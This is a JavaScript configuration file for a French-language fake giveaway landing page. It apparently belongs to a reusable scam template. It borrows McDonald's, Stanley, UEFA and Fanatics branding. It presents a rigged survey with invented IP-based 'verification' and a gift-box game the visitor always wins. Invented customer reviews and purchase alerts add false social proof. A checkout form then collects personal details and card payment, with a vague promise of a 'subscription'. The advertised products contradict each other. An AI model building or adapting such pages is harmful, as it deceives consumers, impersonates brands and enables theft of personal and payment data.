const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // JE REMPLIS CES INFORMATIONS DANS MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer: "Vous ne pouvez commander qu'un seul paquet au prix promotionnel cette semaine.",
    text: `
  Félicitations !<br><br>
  Vous avez participé à la promotion Stanley : vous avez la chance d'acheter le thermos STANLEY QUENCHER H2.0 avec moule à glace pour seulement <b>37$</b> !
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Paris, France",
      action: "Je viens de recevoir le bijou pour 9,99 euros !",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Carlos B******",
      location: "Lyon, France",
      action: "Je viens de recevoir le bijou pour 9,99 euros !",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Matthieu",
      time: "Il y a un jour",
      header: "C'est incroyable !",
      product: "26468781",
      review: "En tant que fan de football depuis de nombreuses années, j'ai été très surpris par la qualité du maillot de l'équipe nationale de France à un prix aussi raisonnable 😊",
    },
    {
      name: "Luc",
      time: "Il y a deux jours",
      header: "Fantastique ! Je n'ai pas de mots.",
      product: "26468783",
      review: "J'ai décidé d'acheter le sac à dos de l'équipe nationale de France pour la première fois et maintenant je l'apprécie à chaque fois que je soutiens mon équipe, merci.",
    },
    {
      name: "Valentine",
      time: "Il y a deux jours",
      header: "Simplement génial.",
      product: "26468784",
      review: "La qualité de cette casquette est incroyable, et la taille est parfaite ! Merci, je la recommanderai à mes amis.",
    },
    {
      name: "Jacques",
      time: "Il y a quatre jours",
      header: "J'aime",
      product: "26468781",
      review: "Honnêtement, j'adore regarder le football, et le nouveau maillot de l'équipe nationale de France était exactement ce dont j'avais besoin.",
    },
    {
      name: "Martine",
      time: "Il y a sept jours",
      header: "Wow, j'adore ce produit !",
      product: "26468782",
      review: "Au début, je pensais que la tasse serait chère, mais heureusement je l'ai achetée et maintenant je profite des meilleurs matchs avec elle. Merci !",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET ÉVALUATIONS",
    percent: "99%",
    rec: "Commentaires sur cette promotion",
  };

  const questions = {
    _of: "Question {1} sur {2} : ",
    arr: [
      {
        q: "Avez-vous déjà commandé des produits McDonald's ?",
        a: [
          "Oui, je commande souvent",
          "Oui, je commande rarement",
          "Je n'ai jamais commandé",
        ],
      },
      {
        q: "McDonald's devrait-il continuer ce type de campagnes publicitaires ?",
        a: ["Oui, bien sûr !", "Oui, mais changez le menu promotionnel", "Non"],
      },
      {
        q: "Recommanderiez-vous nos produits à vos amis ?",
        a: ["Oui", "Non"],
      },
    ],
  };

  const check = {
    title: "Votre réponse sera examinée",
    arr: [
      "Vous avez répondu à la question 3 sur 3",
      "Votre adresse IP ne montre aucune commande précédente",
      "Votre réponse a été vérifiée",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Merci d'avoir participé à l'enquête !",
        button: "Tentez votre chance",
        text: `
<center>
    Pour obtenir le menu promotionnel de McDonald's, vous devez choisir la bonne boîte-cadeau.
    <br><br>
    Vous avez 3 tentatives, bonne chance !
</center>
            `,
      },
    },
    first: {
      texts: {
        header: "Oh, non...",
        button: "Réessayez",
        text: `
<center>
    Malheureusement, ce cadeau est vide. Il vous reste deux tentatives, bonne chance !
</center>
            `,
      },
    },
    win: {
      texts: {
        header: "",
        button: "Passer la commande",
        text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Cliquez sur le bouton « Passer la commande », remplissez le formulaire et payez la commande.
    <br>
    <br>
    Dans un délai de 3 à 5 jours, vous recevrez un email avec votre abonnement et les instructions.
</center>
            `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations Personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "Adresse e-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Moyens de Paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Détails de la Commande",
      oldPrice: "37,90€",
      newPrice: "9,99 €",
      size: "Taille",
      subTotal: {
        title: "Sous-total",
        amount: "9,99 €",
      },
      deliveryTime: {
        title: "Délai de livraison",
        amount: "3 jours",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "9,99 €",
      },
      checkoutButton: "Payer votre commande",
    },
  };


  const products = [
    {
      id: "26468781",
      name: "Abonnement CinéPass : Dites oui au cinéma à volonté !",
      miniImg: "./src/img/price.png",
      images: ["./src/img/price.png"],
    }
  ];

  const footer = {
    cr: "© 2024, UEFA and Fanatics, Inc.. All rights reserved. No portion of this site may be reproduced or duplicated without the express permission of UEFA and/or Fanatics (as applicable). The words UEFA, UEFA Nations League, UEFA Nations League Finals, Finalissima, UEFA U21 Championships, UEFA EURO and UEFA Women’s EURO and all other UEFA marks, names, mascots and trophies are the property, registered trademarks, designs and/or copyright of UEFA. Store maintained and operated by Fanatics (International) Limited.",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});